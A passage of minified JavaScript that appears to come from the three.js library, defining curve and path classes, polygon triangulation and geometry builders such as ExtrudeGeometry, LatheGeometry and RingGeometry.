re,n=this.points,r=(n.length-1)*e,i=Math.floor(r),a=r-i,o=n[0===i?i:i-1],s=n[i],l=n[i>n.length-2?n.length-1:i+1],c=n[i>n.length-3?n.length-1:i+2];return t.set(ps(a,o.x,s.x,l.x,c.x),ps(a,o.y,s.y,l.y,c.y)),t}},{key:"copy",value:function(e){_get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.points=[];for(var t=0,r=e.points.length;t<r;t++){var i=e.points[t];this.points.push(i.clone())}return this}},{key:"toJSON",value:function(){var e=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this);e.points=[];for(var t=0,r=this.points.length;t<r;t++){var i=this.points[t];e.points.push(i.toArray())}return e}},{key:"fromJSON",value:function(e){_get2(_getPrototypeOf(n.prototype),"fromJSON",this).call(this,e),this.points=[];for(var t=0,r=e.points.length;t<r;t++){var i=e.points[t];this.points.push((new re).fromArray(i))}return this}}]),n}();_s.prototype.isSplineCurve=!0;var ws=Object.freeze({__proto__:null,ArcCurve:as,CatmullRomCurve3:ds,CubicBezierCurve:As,CubicBezierCurve3:ms,EllipseCurve:is,LineCurve:vs,LineCurve3:gs,QuadraticBezierCurve:ys,QuadraticBezierCurve3:bs,SplineCurve:_s}),Cs=function(e){_inherits2(n,rs);var t=_createSuper(n);function n(){var e;return _classCallCheck2(this,n),(e=t.call(this)).type="CurvePath",e.curves=[],e.autoClose=!1,e}return _createClass2(n,[{key:"add",value:function(e){this.curves.push(e)}},{key:"closePath",value:function(){var e=this.curves[0].getPoint(0),t=this.curves[this.curves.length-1].getPoint(1);e.equals(t)||this.curves.push(new vs(t,e))}},{key:"getPoint",value:function(e,t){for(var n=e*this.getLength(),r=this.getCurveLengths(),i=0;i<r.length;){if(r[i]>=n){var a=r[i]-n,o=this.curves[i],s=o.getLength(),l=0===s?0:1-a/s;return o.getPointAt(l,t)}i++}return null}},{key:"getLength",value:function(){var e=this.getCurveLengths();return e[e.length-1]}},{key:"updateArcLengths",value:function(){this.needsUpdate=!0,this.cacheLengths=null,this.getCurveLengths()}},{key:"getCurveLengths",value:function(){if(this.cacheLengths&&this.cacheLengths.length===this.curves.length)return this.cacheLengths;for(var e=[],t=0,n=0,r=this.curves.length;n<r;n++)t+=this.curves[n].getLength(),e.push(t);return this.cacheLengths=e}},{key:"getSpacedPoints",value:function(){for(var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:40,t=[],n=0;n<=e;n++)t.push(this.getPoint(n/e));return this.autoClose&&t.push(t[0]),t}},{key:"getPoints",value:function(){for(var e,t=0<arguments.length&&void 0!==arguments[0]?arguments[0]:12,n=[],r=0,i=this.curves;r<i.length;r++)for(var a=i[r],o=a&&a.isEllipseCurve?2*t:a&&(a.isLineCurve||a.isLineCurve3)?1:a&&a.isSplineCurve?t*a.points.length:t,s=a.getPoints(o),l=0;l<s.length;l++){var c=s[l];e&&e.equals(c)||(n.push(c),e=c)}return this.autoClose&&1<n.length&&!n[n.length-1].equals(n[0])&&n.push(n[0]),n}},{key:"copy",value:function(e){_get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.curves=[];for(var t=0,r=e.curves.length;t<r;t++){var i=e.curves[t];this.curves.push(i.clone())}return this.autoClose=e.autoClose,this}},{key:"toJSON",value:function(){var e=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this);e.autoClose=this.autoClose,e.curves=[];for(var t=0,r=this.curves.length;t<r;t++){var i=this.curves[t];e.curves.push(i.toJSON())}return e}},{key:"fromJSON",value:function(e){_get2(_getPrototypeOf(n.prototype),"fromJSON",this).call(this,e),this.autoClose=e.autoClose,this.curves=[];for(var t=0,r=e.curves.length;t<r;t++){var i=e.curves[t];this.curves.push((new ws[i.type]).fromJSON(i))}return this}}]),n}(),xs=function(e){_inherits2(n,Cs);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this)).type="Path",r.currentPoint=new re,e&&r.setFromPoints(e),r}return _createClass2(n,[{key:"setFromPoints",value:function(e){this.moveTo(e[0].x,e[0].y);for(var t=1,n=e.length;t<n;t++)this.lineTo(e[t].x,e[t].y);return this}},{key:"moveTo",value:function(e,t){return this.currentPoint.set(e,t),this}},{key:"lineTo",value:function(e,t){var n=new vs(this.currentPoint.clone(),new re(e,t));return this.curves.push(n),this.currentPoint.set(e,t),this}},{key:"quadraticCurveTo",value:function(e,t,n,r){var i=new ys(this.currentPoint.clone(),new re(e,t),new re(n,r));return this.curves.push(i),this.currentPoint.set(n,r),this}},{key:"bezierCurveTo",value:function(e,t,n,r,i,a){var o=new As(this.currentPoint.clone(),new re(e,t),new re(n,r),new re(i,a));return this.curves.push(o),this.currentPoint.set(i,a),this}},{key:"splineThru",value:function(e){var t=[this.currentPoint.clone()].concat(e),n=new _s(t);return this.curves.push(n),this.currentPoint.copy(e[e.length-1]),this}},{key:"arc",value:function(e,t,n,r,i,a){var o=this.currentPoint.x,s=this.currentPoint.y;return this.absarc(e+o,t+s,n,r,i,a),this}},{key:"absarc",value:function(e,t,n,r,i,a){return this.absellipse(e,t,n,n,r,i,a),this}},{key:"ellipse",value:function(e,t,n,r,i,a,o,s){var l=this.currentPoint.x,c=this.currentPoint.y;return this.absellipse(e+l,t+c,n,r,i,a,o,s),this}},{key:"absellipse",value:function(e,t,n,r,i,a,o,s){var l=new is(e,t,n,r,i,a,o,s);if(0<this.curves.length){var c=l.getPoint(0);c.equals(this.currentPoint)||this.lineTo(c.x,c.y)}this.curves.push(l);var u=l.getPoint(1);return this.currentPoint.copy(u),this}},{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.currentPoint.copy(e.currentPoint),this}},{key:"toJSON",value:function(){var e=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this);return e.currentPoint=this.currentPoint.toArray(),e}},{key:"fromJSON",value:function(e){return _get2(_getPrototypeOf(n.prototype),"fromJSON",this).call(this,e),this.currentPoint.fromArray(e.currentPoint),this}}]),n}(),Ss=function(e){_inherits2(n,xs);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this,e)).uuid=q(),r.type="Shape",r.holes=[],r}return _createClass2(n,[{key:"getPointsHoles",value:function(e){for(var t=[],n=0,r=this.holes.length;n<r;n++)t[n]=this.holes[n].getPoints(e);return t}},{key:"extractPoints",value:function(e){return{shape:this.getPoints(e),holes:this.getPointsHoles(e)}}},{key:"copy",value:function(e){_get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.holes=[];for(var t=0,r=e.holes.length;t<r;t++){var i=e.holes[t];this.holes.push(i.clone())}return this}},{key:"toJSON",value:function(){var e=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this);e.uuid=this.uuid,e.holes=[];for(var t=0,r=this.holes.length;t<r;t++){var i=this.holes[t];e.holes.push(i.toJSON())}return e}},{key:"fromJSON",value:function(e){_get2(_getPrototypeOf(n.prototype),"fromJSON",this).call(this,e),this.uuid=e.uuid,this.holes=[];for(var t=0,r=e.holes.length;t<r;t++){var i=e.holes[t];this.holes.push((new xs).fromJSON(i))}return this}}]),n}();function ks(e,t,n,r,i){var a,o;if(i===0<function(e,t,n,r){for(var i=0,a=t,o=n-r;a<n;a+=r)i+=(e[o]-e[a])*(e[a+1]+e[o+1]),o=a;return i}(e,t,n,r))for(a=t;a<n;a+=r)o=Qs(a,e[a],e[a+1],o);else for(a=n-r;t<=a;a-=r)o=Qs(a,e[a],e[a+1],o);return o&&js(o,o.next)&&(Gs(o),o=o.next),o}function Ms(e,t){if(!e)return e;t||(t=e);var n,r=e;do{if(n=!1,r.steiner||!js(r,r.next)&&0!==Rs(r.prev,r,r.next))r=r.next;else{if(Gs(r),(r=t=r.prev)===r.next)break;n=!0}}while(n||r!==t);return t}function Bs(e,t,n,r,i,a,o){if(e){!o&&a&&function(e,t,n,r){for(var i=e;null===i.z&&(i.z=Os(i.x,i.y,t,n,r)),i.prevZ=i.prev,i.nextZ=i.next,(i=i.next)!==e;);i.prevZ.nextZ=null,i.prevZ=null,function(e){var t,n,r,i,a,o,s,l,c=1;do{for(n=e,a=e=null,o=0;n;){for(o++,r=n,t=s=0;t<c&&(s++,r=r.nextZ);t++);for(l=c;0<s||0<l&&r;)0!==s&&(0===l||!r||n.z<=r.z)?(n=(i=n).nextZ,s--):(r=(i=r).nextZ,l--),a?a.nextZ=i:e=i,i.prevZ=a,a=i;n=r}a.nextZ=null,c*=2}while(1<o)}(i)}(e,r,i,a);for(var s,l,c=e;e.prev!==e.next;)if(s=e.prev,l=e.next,a?Ts(e,r,i,a):Es(e))t.push(s.i/n),t.push(e.i/n),t.push(l.i/n),Gs(e),e=l.next,c=l.next;else if((e=l)===c){o?1===o?Bs(e=Ps(Ms(e),t,n),t,n,r,i,a,2):2===o&&Is(e,t,n,r,i,a):Bs(Ms(e),t,n,r,i,a,1);break}}}function Es(e){var t=e.prev,n=e,r=e.next;if(0<=Rs(t,n,r))return!1;for(var i=e.next.next;i!==e.prev;){if(Ds(t.x,t.y,n.x,n.y,r.x,r.y,i.x,i.y)&&0<=Rs(i.prev,i,i.next))return!1;i=i.next}return!0}function Ts(e,t,n,r){var i=e.prev,a=e,o=e.next;if(0<=Rs(i,a,o))return!1;for(var s=i.x<a.x?i.x<o.x?i.x:o.x:a.x<o.x?a.x:o.x,l=i.y<a.y?i.y<o.y?i.y:o.y:a.y<o.y?a.y:o.y,c=i.x>a.x?i.x>o.x?i.x:o.x:a.x>o.x?a.x:o.x,u=i.y>a.y?i.y>o.y?i.y:o.y:a.y>o.y?a.y:o.y,d=Os(s,l,t,n,r),p=Os(c,u,t,n,r),h=e.prevZ,f=e.nextZ;h&&h.z>=d&&f&&f.z<=p;){if(h!==e.prev&&h!==e.next&&Ds(i.x,i.y,a.x,a.y,o.x,o.y,h.x,h.y)&&0<=Rs(h.prev,h,h.next))return!1;if(h=h.prevZ,f!==e.prev&&f!==e.next&&Ds(i.x,i.y,a.x,a.y,o.x,o.y,f.x,f.y)&&0<=Rs(f.prev,f,f.next))return!1;f=f.nextZ}for(;h&&h.z>=d;){if(h!==e.prev&&h!==e.next&&Ds(i.x,i.y,a.x,a.y,o.x,o.y,h.x,h.y)&&0<=Rs(h.prev,h,h.next))return!1;h=h.prevZ}for(;f&&f.z<=p;){if(f!==e.prev&&f!==e.next&&Ds(i.x,i.y,a.x,a.y,o.x,o.y,f.x,f.y)&&0<=Rs(f.prev,f,f.next))return!1;f=f.nextZ}return!0}function Ps(e,t,n){var r=e;do{var i=r.prev,a=r.next.next;!js(i,a)&&Us(i,r,r.next,a)&&Hs(i,a)&&Hs(a,i)&&(t.push(i.i/n),t.push(r.i/n),t.push(a.i/n),Gs(r),Gs(r.next),r=e=a),r=r.next}while(r!==e);return Ms(r)}function Is(e,t,n,r,i,a){var o,s,l=e;do{for(var c=l.next.next;c!==l.prev;){if(l.i!==c.i&&(s=c,(o=l).next.i!==s.i&&o.prev.i!==s.i&&!function(e,t){var n=e;do{if(n.i!==e.i&&n.next.i!==e.i&&n.i!==t.i&&n.next.i!==t.i&&Us(n,n.next,e,t))return!0;n=n.next}while(n!==e);return!1}(o,s)&&(Hs(o,s)&&Hs(s,o)&&function(e,t){for(var n=e,r=!1,i=(e.x+t.x)/2,a=(e.y+t.y)/2;n.y>a!=n.next.y>a&&n.next.y!==n.y&&i<(n.next.x-n.x)*(a-n.y)/(n.next.y-n.y)+n.x&&(r=!r),(n=n.next)!==e;);return r}(o,s)&&(Rs(o.prev,o,s.prev)||Rs(o,s.prev,s))||js(o,s)&&0<Rs(o.prev,o,o.next)&&0<Rs(s.prev,s,s.next)))){var u=Vs(l,c);return l=Ms(l,l.next),u=Ms(u,u.next),Bs(l,t,n,r,i,a),void Bs(u,t,n,r,i,a)}c=c.next}l=l.next}while(l!==e)}function Fs(e,t){return e.x-t.x}function Ls(e,t){if(t=function(e,t){var n,r=t,i=e.x,a=e.y,o=-1/0;do{if(a<=r.y&&a>=r.next.y&&r.next.y!==r.y){var s=r.x+(a-r.y)*(r.next.x-r.x)/(r.next.y-r.y);if(s<=i&&o<s){if((o=s)===i){if(a===r.y)return r;if(a===r.next.y)return r.next}n=r.x<r.next.x?r:r.next}}r=r.next}while(r!==t);if(!n)return null;if(i===o)return n;var l,c,u,d=n,p=n.x,h=n.y,f=1/0;for(r=n;i>=r.x&&r.x>=p&&i!==r.x&&Ds(a<h?i:o,a,p,h,a<h?o:i,a,r.x,r.y)&&(l=Math.abs(a-r.y)/(i-r.x),Hs(r,e)&&(l<f||l===f&&(r.x>n.x||r.x===n.x&&(u=r,Rs((c=n).prev,c,u.prev)<0&&Rs(u.next,c,c.next)<0)))&&(n=r,f=l)),(r=r.next)!==d;);return n}(e,t)){var n=Vs(t,e);Ms(t,t.next),Ms(n,n.next)}}function Os(e,t,n,r,i){return(e=1431655765&((e=858993459&((e=252645135&((e=16711935&((e=32767*(e-n)*i)|e<<8))|e<<4))|e<<2))|e<<1))|(t=1431655765&((t=858993459&((t=252645135&((t=16711935&((t=32767*(t-r)*i)|t<<8))|t<<4))|t<<2))|t<<1))<<1}function Ns(e){for(var t=e,n=e;(t.x<n.x||t.x===n.x&&t.y<n.y)&&(n=t),(t=t.next)!==e;);return n}function Ds(e,t,n,r,i,a,o,s){return 0<=(i-o)*(t-s)-(e-o)*(a-s)&&0<=(e-o)*(r-s)-(n-o)*(t-s)&&0<=(n-o)*(a-s)-(i-o)*(r-s)}function Rs(e,t,n){return(t.y-e.y)*(n.x-t.x)-(t.x-e.x)*(n.y-t.y)}function js(e,t){return e.x===t.x&&e.y===t.y}function Us(e,t,n,r){var i=zs(Rs(e,t,n)),a=zs(Rs(e,t,r)),o=zs(Rs(n,r,e)),s=zs(Rs(n,r,t));return i!==a&&o!==s||!(0!==i||!$s(e,n,t))||!(0!==a||!$s(e,r,t))||!(0!==o||!$s(n,e,r))||!(0!==s||!$s(n,t,r))}function $s(e,t,n){return t.x<=Math.max(e.x,n.x)&&t.x>=Math.min(e.x,n.x)&&t.y<=Math.max(e.y,n.y)&&t.y>=Math.min(e.y,n.y)}function zs(e){return 0<e?1:e<0?-1:0}function Hs(e,t){return Rs(e.prev,e,e.next)<0?0<=Rs(e,t,e.next)&&0<=Rs(e,e.prev,t):Rs(e,t,e.prev)<0||Rs(e,e.next,t)<0}function Vs(e,t){var n=new Ws(e.i,e.x,e.y),r=new Ws(t.i,t.x,t.y),i=e.next,a=t.prev;return(e.next=t).prev=e,(n.next=i).prev=n,(r.next=n).prev=r,(a.next=r).prev=a,r}function Qs(e,t,n,r){var i=new Ws(e,t,n);return r?(i.next=r.next,(i.prev=r).next.prev=i,r.next=i):(i.prev=i).next=i,i}function Gs(e){e.next.prev=e.prev,e.prev.next=e.next,e.prevZ&&(e.prevZ.nextZ=e.nextZ),e.nextZ&&(e.nextZ.prevZ=e.prevZ)}function Ws(e,t,n){this.i=e,this.x=t,this.y=n,this.prev=null,this.next=null,this.z=null,this.prevZ=null,this.nextZ=null,this.steiner=!1}var Ks=function(){function e(){_classCallCheck2(this,e)}return _createClass2(e,null,[{key:"area",value:function(e){for(var t=e.length,n=0,r=t-1,i=0;i<t;r=i++)n+=e[r].x*e[i].y-e[i].x*e[r].y;return.5*n}},{key:"isClockWise",value:function(t){return e.area(t)<0}},{key:"triangulateShape",value:function(e,t){var n=[],r=[],i=[];qs(e),Xs(n,e);var a=e.length;t.forEach(qs);for(var o=0;o<t.length;o++)r.push(a),a+=t[o].length,Xs(n,t[o]);for(var s=function(e,t){var n,r,i,a,o,s,l,c=2<arguments.length&&void 0!==arguments[2]?arguments[2]:2,u=t&&t.length,d=u?t[0]*c:e.length,p=ks(e,0,d,c,!0),h=[];if(!p||p.next===p.prev)return h;if(u&&(p=function(e,t,n,r){var i,a,o,s=[];for(i=0,a=t.length;i<a;i++)(o=ks(e,t[i]*r,i<a-1?t[i+1]*r:e.length,r,!1))===o.next&&(o.steiner=!0),s.push(Ns(o));for(s.sort(Fs),i=0;i<s.length;i++)Ls(s[i],n),n=Ms(n,n.next);return n}(e,t,p,c)),e.length>80*c){n=i=e[0],r=a=e[1];for(var f=c;f<d;f+=c)(o=e[f])<n&&(n=o),(s=e[f+1])<r&&(r=s),i<o&&(i=o),a<s&&(a=s);l=0!==(l=Math.max(i-n,a-r))?1/l:0}return Bs(p,h,c,n,r,l),h}(n,r),l=0;l<s.length;l+=3)i.push(s.slice(l,l+3));return i}}]),e}();function qs(e){var t=e.length;2<t&&e[t-1].equals(e[0])&&e.pop()}function Xs(e,t){for(var n=0;n<t.length;n++)e.push(t[n].x),e.push(t[n].y)}var Ys=function(e){_inherits2(n,un);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:new Ss([new re(.5,.5),new re(-.5,.5),new re(-.5,-.5),new re(.5,-.5)]),i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:{};_classCallCheck2(this,n),(e=t.call(this)).type="ExtrudeGeometry",e.parameters={shapes:r,options:i},r=Array.isArray(r)?r:[r];for(var a=_assertThisInitialized2(e),o=[],s=[],l=0,c=r.length;l<c;l++)u(r[l]);function u(e){var t=[],n=void 0!==i.curveSegments?i.curveSegments:12,r=void 0!==i.steps?i.steps:1,l=void 0!==i.depth?i.depth:1,c=void 0===i.bevelEnabled||i.bevelEnabled,u=void 0!==i.bevelThickness?i.bevelThickness:.2,d=void 0!==i.bevelSize?i.bevelSize:u-.1,p=void 0!==i.bevelOffset?i.bevelOffset:0,h=void 0!==i.bevelSegments?i.bevelSegments:3,f=i.extrudePath,A=void 0!==i.UVGenerator?i.UVGenerator:Js;void 0!==i.amount&&(l=i.amount);var m,v,g,y,b,_=!1;f&&(m=f.getSpacedPoints(r),c=!(_=!0),v=f.computeFrenetFrames(r,!1),g=new ye,y=new ye,b=new ye),c||(p=d=u=h=0);var w=e.extractPoints(n),C=w.shape,x=w.holes;if(!Ks.isClockWise(C)){C=C.reverse();for(var S=0,k=x.length;S<k;S++){var M=x[S];Ks.isClockWise(M)&&(x[S]=M.reverse())}}for(var B=Ks.triangulateShape(C,x),E=C,T=0,P=x.length;T<P;T++){var I=x[T];C=C.concat(I)}function F(e,t,n){return t.clone().multiplyScalar(n).add(e)}var L=C.length,O=B.length;function N(e,t,n){var r,i,a,o=e.x-t.x,s=e.y-t.y,l=n.x-e.x,c=n.y-e.y,u=o*o+s*s,d=o*c-s*l;if(Math.abs(d)>Number.EPSILON){var p=Math.sqrt(u),h=Math.sqrt(l*l+c*c),f=t.x-s/p,A=t.y+o/p,m=((n.x-c/h-f)*c-(n.y+l/h-A)*l)/(o*c-s*l),v=(r=f+o*m-e.x)*r+(i=A+s*m-e.y)*i;if(v<=2)return new re(r,i);a=Math.sqrt(v/2)}else{var g=!1;o>Number.EPSILON?l>Number.EPSILON&&(g=!0):o<-Number.EPSILON?l<-Number.EPSILON&&(g=!0):Math.sign(s)===Math.sign(c)&&(g=!0),a=g?(r=-s,i=o,Math.sqrt(u)):(r=o,i=s,Math.sqrt(u/2))}return new re(r/a,i/a)}for(var D=[],R=0,j=E.length,U=j-1,$=R+1;R<j;R++,U++,$++)U===j&&(U=0),$===j&&($=0),D[R]=N(E[R],E[U],E[$]);for(var z,H=[],V=D.concat(),Q=0,G=x.length;Q<G;Q++){var W=x[Q];z=[];for(var K=0,q=W.length,X=q-1,Y=K+1;K<q;K++,X++,Y++)X===q&&(X=0),Y===q&&(Y=0),z[K]=N(W[K],W[X],W[Y]);H.push(z),V=V.concat(z)}for(var J=0;J<h;J++){for(var Z=J/h,ee=u*Math.cos(Z*Math.PI/2),te=d*Math.sin(Z*Math.PI/2)+p,ne=0,ie=E.length;ne<ie;ne++){var ae=F(E[ne],D[ne],te);Fe(ae.x,ae.y,-ee)}for(var oe=0,se=x.length;oe<se;oe++){var le=x[oe];z=H[oe];for(var ce=0,ue=le.length;ce<ue;ce++){var de=F(le[ce],z[ce],te);Fe(de.x,de.y,-ee)}}}for(var pe=d+p,he=0;he<L;he++){var fe=c?F(C[he],V[he],pe):C[he];_?(y.copy(v.normals[0]).multiplyScalar(fe.x),g.copy(v.binormals[0]).multiplyScalar(fe.y),b.copy(m[0]).add(y).add(g),Fe(b.x,b.y,b.z)):Fe(fe.x,fe.y,0)}for(var Ae=1;Ae<=r;Ae++)for(var me=0;me<L;me++){var ve=c?F(C[me],V[me],pe):C[me];_?(y.copy(v.normals[Ae]).multiplyScalar(ve.x),g.copy(v.binormals[Ae]).multiplyScalar(ve.y),b.copy(m[Ae]).add(y).add(g),Fe(b.x,b.y,b.z)):Fe(ve.x,ve.y,l/r*Ae)}for(var ge=h-1;0<=ge;ge--){for(var be=ge/h,_e=u*Math.cos(be*Math.PI/2),we=d*Math.sin(be*Math.PI/2)+p,Ce=0,xe=E.length;Ce<xe;Ce++){var Se=F(E[Ce],D[Ce],we);Fe(Se.x,Se.y,l+_e)}for(var ke=0,Me=x.length;ke<Me;ke++){var Be=x[ke];z=H[ke];for(var Ee=0,Te=Be.length;Ee<Te;Ee++){var Pe=F(Be[Ee],z[Ee],we);_?Fe(Pe.x,Pe.y+m[r-1].y,m[r-1].x+_e):Fe(Pe.x,Pe.y,l+_e)}}}function Ie(e,t){for(var n=e.length;0<=--n;){var i=n,a=n-1;a<0&&(a=e.length-1);for(var o=0,s=r+2*h;o<s;o++){var l=L*o,c=L*(o+1);Oe(t+i+l,t+a+l,t+a+c,t+i+c)}}}function Fe(e,n,r){t.push(e),t.push(n),t.push(r)}function Le(e,t,n){Ne(e),Ne(t),Ne(n);var r=o.length/3,i=A.generateTopUV(a,o,r-3,r-2,r-1);De(i[0]),De(i[1]),De(i[2])}function Oe(e,t,n,r){Ne(e),Ne(t),Ne(r),Ne(t),Ne(n),Ne(r);var i=o.length/3,s=A.generateSideWallUV(a,o,i-6,i-3,i-2,i-1);De(s[0]),De(s[1]),De(s[3]),De(s[1]),De(s[2]),De(s[3])}function Ne(e){o.push(t[3*e+0]),o.push(t[3*e+1]),o.push(t[3*e+2])}function De(e){s.push(e.x),s.push(e.y)}!function(){var e=o.length/3;if(c){for(var t=0,n=L*t,i=0;i<O;i++){var s=B[i];Le(s[2]+n,s[1]+n,s[0]+n)}n=L*(t=r+2*h);for(var l=0;l<O;l++){var u=B[l];Le(u[0]+n,u[1]+n,u[2]+n)}}else{for(var d=0;d<O;d++){var p=B[d];Le(p[2],p[1],p[0])}for(var f=0;f<O;f++){var A=B[f];Le(A[0]+L*r,A[1]+L*r,A[2]+L*r)}}a.addGroup(e,o.length/3-e,0)}(),function(){var e=o.length/3,t=0;Ie(E,t),t+=E.length;for(var n=0,r=x.length;n<r;n++){var i=x[n];Ie(i,t),t+=i.length}a.addGroup(e,o.length/3-e,1)}()}return e.setAttribute("position",new en(o,3)),e.setAttribute("uv",new en(s,2)),e.computeVertexNormals(),e}return _createClass2(n,[{key:"toJSON",value:function(){var e=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this);return function(e,t,n){if(n.shapes=[],Array.isArray(e))for(var r=0,i=e.length;r<i;r++){var a=e[r];n.shapes.push(a.uuid)}else n.shapes.push(e.uuid);return void 0!==t.extrudePath&&(n.options.extrudePath=t.extrudePath.toJSON()),n}(this.parameters.shapes,this.parameters.options,e)}}],[{key:"fromJSON",value:function(e,t){for(var r=[],i=0,a=e.shapes.length;i<a;i++){var o=t[e.shapes[i]];r.push(o)}var s=e.options.extrudePath;return void 0!==s&&(e.options.extrudePath=(new ws[s.type]).fromJSON(s)),new n(r,e.options)}}]),n}(),Js={generateTopUV:function(e,t,n,r,i){var a=t[3*n],o=t[3*n+1],s=t[3*r],l=t[3*r+1],c=t[3*i],u=t[3*i+1];return[new re(a,o),new re(s,l),new re(c,u)]},generateSideWallUV:function(e,t,n,r,i,a){var o=t[3*n],s=t[3*n+1],l=t[3*n+2],c=t[3*r],u=t[3*r+1],d=t[3*r+2],p=t[3*i],h=t[3*i+1],f=t[3*i+2],A=t[3*a],m=t[3*a+1],v=t[3*a+2];return Math.abs(s-u)<Math.abs(o-c)?[new re(o,1-l),new re(c,1-d),new re(p,1-f),new re(A,1-v)]:[new re(s,1-l),new re(u,1-d),new re(h,1-f),new re(m,1-v)]}},Zs=function(e){_inherits2(n,Xo);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:1,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0;_classCallCheck2(this,n);var a=(1+Math.sqrt(5))/2,o=[-1,a,0,1,a,0,-1,-a,0,1,-a,0,0,-1,a,0,1,a,0,-1,-a,0,1,-a,a,0,-1,a,0,1,-a,0,-1,-a,0,1];return(e=t.call(this,o,[0,11,5,0,5,1,0,1,7,0,7,10,0,10,11,1,5,9,5,11,4,11,10,2,10,7,6,7,1,8,3,9,4,3,4,2,3,2,6,3,6,8,3,8,9,4,9,5,2,4,11,6,2,10,8,6,7,9,8,1],r,i)).type="IcosahedronGeometry",e.parameters={radius:r,detail:i},e}return _createClass2(n,null,[{key:"fromJSON",value:function(e){return new n(e.radius,e.detail)}}]),n}(),el=function(e){_inherits2(n,un);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:[new re(0,.5),new re(.5,0),new re(0,-.5)],i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:12,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:0,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:2*Math.PI;_classCallCheck2(this,n),(e=t.call(this)).type="LatheGeometry",e.parameters={points:r,segments:i,phiStart:a,phiLength:o},i=Math.floor(i),o=X(o,0,2*Math.PI);for(var s=[],l=[],c=[],u=[],d=[],p=1/i,h=new ye,f=new re,A=new ye,m=new ye,v=new ye,g=0,y=0,b=0;b<=r.length-1;b++)switch(b){case 0:g=r[b+1].x-r[b].x,y=r[b+1].y-r[b].y,A.x=1*y,A.y=-g,A.z=0*y,v.copy(A),A.normalize(),u.push(A.x,A.y,A.z);break;case r.length-1:u.push(v.x,v.y,v.z);break;default:g=r[b+1].x-r[b].x,y=r[b+1].y-r[b].y,A.x=1*y,A.y=-g,A.z=0*y,m.copy(A),A.x+=v.x,A.y+=v.y,A.z+=v.z,A.normalize(),u.push(A.x,A.y,A.z),v.copy(m)}for(var _=0;_<=i;_++)for(var w=a+_*p*o,C=Math.sin(w),x=Math.cos(w),S=0;S<=r.length-1;S++){h.x=r[S].x*C,h.y=r[S].y,h.z=r[S].x*x,l.push(h.x,h.y,h.z),f.x=_/i,f.y=S/(r.length-1),c.push(f.x,f.y);var k=u[3*S+0]*C,M=u[3*S+1],B=u[3*S+0]*x;d.push(k,M,B)}for(var E=0;E<i;E++)for(var T=0;T<r.length-1;T++){var P=T+E*r.length,I=P,F=P+r.length,L=P+r.length+1,O=P+1;s.push(I,F,O),s.push(F,L,O)}return e.setIndex(s),e.setAttribute("position",new en(l,3)),e.setAttribute("uv",new en(c,2)),e.setAttribute("normal",new en(d,3)),e}return _createClass2(n,null,[{key:"fromJSON",value:function(e){return new n(e.points,e.segments,e.phiStart,e.phiLength)}}]),n}(),tl=function(e){_inherits2(n,Xo);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:1,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0;return _classCallCheck2(this,n),(e=t.call(this,[1,0,0,-1,0,0,0,1,0,0,-1,0,0,0,1,0,0,-1],[0,2,4,0,4,3,0,3,5,0,5,2,1,2,5,1,5,3,1,3,4,1,4,2],r,i)).type="OctahedronGeometry",e.parameters={radius:r,detail:i},e}return _createClass2(n,null,[{key:"fromJSON",value:function(e){return new n(e.radius,e.detail)}}]),n}(),nl=function(e){_inherits2(n,un);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:.5,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:1,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:8,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:1,s=4<arguments.length&&void 0!==arguments[4]?arguments[4]:0,l=5<arguments.length&&void 0!==arguments[5]?arguments[5]:2*Math.PI;_classCallCheck2(this,n),(e=t.call(this)).type="RingGeometry",e.parameters={innerRadius:r,outerRadius:i,thetaSegments:a,phiSegments:o,thetaStart:s,thetaLength:l},a=Math.max(3,a);for(var c=[],u=[],d=[],p=[],h=r,f=(i-r)/(o=Math.max(1,o)),A=new ye,m=new re,v=0;v<=o;v++){for(var g=0;g<=a;g++){var y=s+g/a*l;A.x=h*Math.cos(y),A.y=h*Math.sin(y),u.push(A.x,A.y,A.z),d.push(0,0,1),m.x=(A.x/i+1)/2,m.y=(A.y/i+1)/2,p.push(m.x,m.y)}h+=f}for(var b=0;b<o;b++)for(var _=b*(a+1),w=0;w<a;w++){var C=w+_,x=C,S=C+a+1,k=C+a+2,M=C+1;c.push(x,S,M),c.push(S,k,M)}return e.setIndex(c),e.setAttribute("position",new en(u,3)),e.setAttribute("normal",new en(d,3)),e.setAttribute("uv",new en(p,2)),e}return _createClass2(n,null,[{key:"fromJSON",value:function(e){return new n(e.innerRadius,e.outerRadius,e.thetaSegments,e.phiSegments,e.thetaStart,e.thetaLength)}}]),n}(),rl=function(e){_inherits2(n,un);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:new Ss([new re(0,.5),new re(-.5,-.5),new re(.5,-.5)]),i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:12;_classCallCheck2(this,n),(e=t.call(this)).type="ShapeGeometry",e.parameters={shapes:r,curveSegments:i};var a=[],o=[],s=[],l=[],c=0,u=0;if(!1===Array.isArray(r))p(r);else for(var 